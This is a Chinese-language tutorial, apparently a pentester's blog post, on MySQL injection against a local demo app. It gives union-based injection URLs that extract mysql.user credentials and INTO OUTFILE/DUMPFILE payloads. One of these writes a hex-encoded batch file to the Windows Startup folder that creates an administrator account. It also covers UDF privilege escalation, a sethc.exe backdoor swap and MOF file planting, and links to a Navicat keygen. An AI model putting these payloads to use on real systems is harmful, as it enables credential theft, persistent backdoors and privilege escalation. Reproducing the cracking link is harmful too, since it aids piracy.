#### Mysql查询和注入技巧：
只要是从事渗透测试工作的同学或者对Web比较喜爱的同学强荐大家学习下SQL语句和Web开发基础，SQL管理客户端有一个神器叫Navicat。支持MySQL,
SQL Server, SQLite, Oracle 和 PostgreSQL
databases。官方下载地址：不过需要注册，注册机：[http://pan.baidu.com/share/link?shareid=271653&uk=1076602916](http://pan.baidu.com/share/link?shareid=271653&amp;uk=1076602916)
其次是下载吧有全套的下载。
似乎很多人都知道Mysql有个数据库叫information_schema里面存储了很多跟Mysql有关的信息，但是不知道里面具体都有些什么，有时间大家可以抽空看下。Mysql的sechema都存在于此，包含了字段、表、元数据等各种信息。也就是对于Mysql来说创建一张表后对应的表信息会存储到information_schema里面，而且可以用SQL语句查询。
使用Navicat构建SQL查询语句：
当我们在SQL注入当中找到用户或管理员所在的表是非常重要的，而当我们想要快速找到跟用户相关的数据库表时候在Mysql里面就可以合理的使用information_schema去查询。构建SQL查询获取所有当前数据库当中数据库表名里面带有user关键字的演示：
查询包含user关键字的表名的结果：  
假设已知某个网站用户数据非常大，我们可以通过上面构建的SQL去找到对应可能存在用户数据信息的表。
查询Mysql所有数据库中所有表名带有user关键字的表，并且按照表的行数降序排列：
    SELECT
    i.TABLE_NAME,i.TABLE_ROWS
    FROM information_schema.`TABLES` AS i
    WHERE i.TABLE_NAME
    LIKE '%user%'
    ORDER BY i.TABLE_ROWS
    DESC
查只在当前数据库查询：
    SELECT
    i.TABLE_NAME,i.TABLE_ROWS
    FROM information_schema.`TABLES` AS i
    WHERE i.TABLE_NAME
    LIKE '%user%'
    AND i.TABLE_SCHEMA = database()
    ORDER BY i.TABLE_ROWS
    DESC
查询指定数据库：  
查询字段当中带有user关键字的所有的表名和数据库名：
    SELECT
    i.TABLE_SCHEMA,i.TABLE_NAME,i.COLUMN_NAME
    FROM information_schema.`COLUMNS` AS i
    WHERE i.COLUMN_NAME LIKE '%user%'  
#### CONCAT：
    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 1,2,3,CONCAT('MysqlUser:',User,'------MysqlPassword:',Password) FROM mysql.`user` limit 0,1 
#### GROUP_CONCAT
    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 1,2,3,GROUP_CONCAT('MysqlUser:',User,'------MysqlPassword:',Password) FROM mysql.`user` limit 0,1
#### 注入点友情备份:
    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select '','',corps_name,corps_url from corps into outfile'E:/soft/apache-tomcat-7.0.37/webapps/SqlInjection/1.txt'
注入在windows下默认是E:\如果用“\”去表示路径的话需要转换成`E:\\`而更方便的方式是直接用/去表示即E:/。
当我们知道WEB路径的情况下而又有outfile权限直接导出数据库中的用户信息。 
而如果是在一些极端的情况下无法直接outfile我们可以合理的利用concat和GROUP_CONCAT去把数据显示到页面，如果数据量特别大，我们可以用concat加上limit去控制显示的数量。比如每次从页面获取几百条数据？写一个工具去请求构建好的SQL注入点然后把页面的数据取下来，那么数据库的表信息也可以直接从注入点全部取出来。
#### 注入点root权限提权：
##### 1、写启动项：
这个算是非常简单的了，直接写到windows的启动目录就行了，我测试的系统是windows7直接写到:C:/Users/selina/AppData/Roaming/Microsoft/Windows/Start
Menu/Programs/Startup目录就行了。用HackBar去请求一下链接就能过把bat写入到我们的windows的启动菜单了，不过得注意的是360那个狗兔崽子：
    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 0x6E65742075736572207975616E7A20313233202F6164642026206E6574206C6F63616C67726F75702061646D696E6973747261746F7273207975616E7A202F616464,'','','' into outfile 'C:/Users/selina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/1.bat'
##### 2、失败的注入点UDF提权尝试：
MYSQL提权的方式挺多的，并不局限于udf、mof、写windows启动目录、SQL语句替换sethc实现后门等，这里以udf为例，其实udf挺麻烦的，如果麻烦的东东你都能搞定，简单的自然就能过搞定了。
在进行mysql的udf提权的时候需要注意的是mysql的版本，mysql5.1以下导入到windows目录就行了，而mysql<=5.1需要导入到插件目录。我测试的是Mysql
5.5.27我们的首要任务就是找到mysql插件路径。
    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select 1,2,3,@@plugin_dir
获取插件目录方式：
    select @@plugin_dir
    select @@basedir
show variables like ‘%plugins%’
通过MYSQL预留的变量很轻易的就找到了mysql所在目录，那我们需要把udf导出的绝对路径就应该是：`D:/install/dev/mysql5.5/lib/plugin/udf.dll`。现在我们要做的就是怎样通过SQL注入去把这udf导出到上述目录了。
我先说下我是怎么从错误的方法到正确导入的一个过程吧。首先我执行了这么一个SQL：
    SELECT * from corps where id = 1 and 1=2 union select '','','',(CONVERT(0xudf的十六进制 ,CHAR)) INTO DUMPFILE 'D:/install/dev/mysql5.5/lib/plugin/udf.dll'
因为在命令行或执行单条语句的时候转换成char去dumpfile的时候是可以成功导出二进制文件的。
我们用浏览器浏览网页的时候都是以GET方式去提交的，而如果我用GET请求去传这个十六进制的udf的话显然会超过GET请求的限制，于是我简单的构建了一个POST请求去把一个110K的0x传到后端。
用hackbar去发送一个post请求发现失败了，一定是我打开方式不对，呵呵。随手写了个表单提交下：
下载地址:[http://pan.baidu.com/share/link?shareid=1711769621&uk=1076602916 ](http://pan.baidu.com/share/link?shareid=1711769621&amp;uk=1076602916)
提交表单以后发现文件是写进去了，但是为什么就只有84字节捏？  
难道是数据传输的时候被截断了？不至于吧，于是用navicat执行上面的语句：  
我似乎傻逼了，因为查询结果还是只有84字节，结果显然不是我想要的。84字节，不带这么坑的。一计不成又生二计。
不让我直接dumpfile那我间接的去写总行吧？  
1 and 1=2 union select '','','',0xUDF转换后的16进制 INTO
outFILE'D:/install/dev/mysql5.5/lib/plugin/udf.txt'发现格式不对，给hex加上单引号以字符串方式写入试下:
1 and 1=2 union select '','','',’0xUDF转换后的16进制’ INTO
outFILE'D:/install/dev/mysql5.5/lib/plugin/udf.txt'
这次写入的起码是hex了吧，再load_file到查询里面不就行了吗？我们知道load_file得到的肯定是一个blob吧。  
那么在注入点这么去构建一下不就行了：  
其实这都已经2到家了，这跟第一次提交的数据根本就没有两样。Load
file在这里依旧被转换成了0x，我想这不行的话那么应该就只能在blob字段去load_file才能成功吧，因为现在load到了一个字段类型是text的位置里面。估计是被当字符串处理了，但是很显然是没法去找个blob的字段的，(用上面去information_schema去找应该能找到)。也就是说现在需要的是一个blob去临时的存储一下。又因为我们知道MYSQL是不支持多行查询的，所以我们根本就没有办法去建表(想过copy查询建表，但是显然是行不通的)。
这不科学，一定是打开方式不对。CAST 和CONVERT
转换成CHAR都不行。能转换成blob之类的吗？CONVERT(0xsbsbsb,BLOB)发现失败了，把BLOB换成 BINARY发现成功执行了。
于是用构建的表单再次执行下面的语句： `SELECT * from corps where id = 1 and 1=2 union select
&#39;&#39;,&#39;&#39;,&#39;&#39;, CONVERT(0x不解释,BINARY) INTO
DUMPFILE&#39;D:/install/dev/mysql5.5/lib/plugin/udf.dll&#39;`
这次执行成功了，哦多么痛的领悟……一开始把CHAR写成BINARY不就搞定了，二的太明显了。其实上面的二根本就不是事儿，更二的是当我要执行的时候恍然发现根本就没有办法去创建function啊！
O shit shift~ Mysql Driver在pstt.executeQuery()是不支持多行查询的，一个select
在怎么也不能跟create同时执行。为了不影响大家心情还是继续写下去吧，命令行建立一个function，然后在注入点注入（如果有前人已经创建udf的情况下可以直接利用）：
因为没有办法去创建一个function所以用注入点实现udf提权在上一步就死了，通过在命令行执行创建function只能算是心灵安慰了，只要完成了create
function那一步我们就真的成功了，因为调用自定义function非常简单：
#### MOF和sethc提权：
MOF和sethc提权我就不详讲了，因为看了上面的udf提权你已经具备自己导入任意文件到任意目录了，而MOF实际上就是写一个文件到指定目录，而sethc提权我只成功模糊的过一次。在命令行下利用SQL大概是这样的：
    create table mix_cmd( shift longblob);
    insert into mix_cmd values(load_file(‘c:\windows\system32\cmd.exe’));
    select * from mix_cmd into dumpfile ‘c:\windows\system32\sethc.exe’;
    drop table if exists mix_cmd;
现在的管理员很多都会自作聪明的去把net.exe、net1.exe
、cmd.exe、sethc.exe删除防止入侵。当sethc不存在时我们可以用这个方法去试下，怎么确定是否存在?load_file下看人品了,如果cmd和sethc都不存在那么按照上面的udf提权三部曲上传一个cmd.exe到任意目录。
    SELECT LOAD_FILE('c:/windows/system32/cmd.exe') INTO DUMPFILE'c:/windows/system32/sethc.exe'
MOF大约是这样：
    http://localhost/SqlInjection/index.jsp?id=1 and 1=2 union select char(ascii转换后的代码),'','','' into dumpfile 'c:/windows/system32/wbem/mof/nullevts.mof'
#### Mysql小结：
我想讲的应该是一种方法而不是SQL怎么去写，学会了方法自然就会自己去拓展，当然了最好不要向上面udf那么二。有了上面的demo相信大家都会知道怎么去修改满足自己的需求了。学的不只是方法而是思路切记！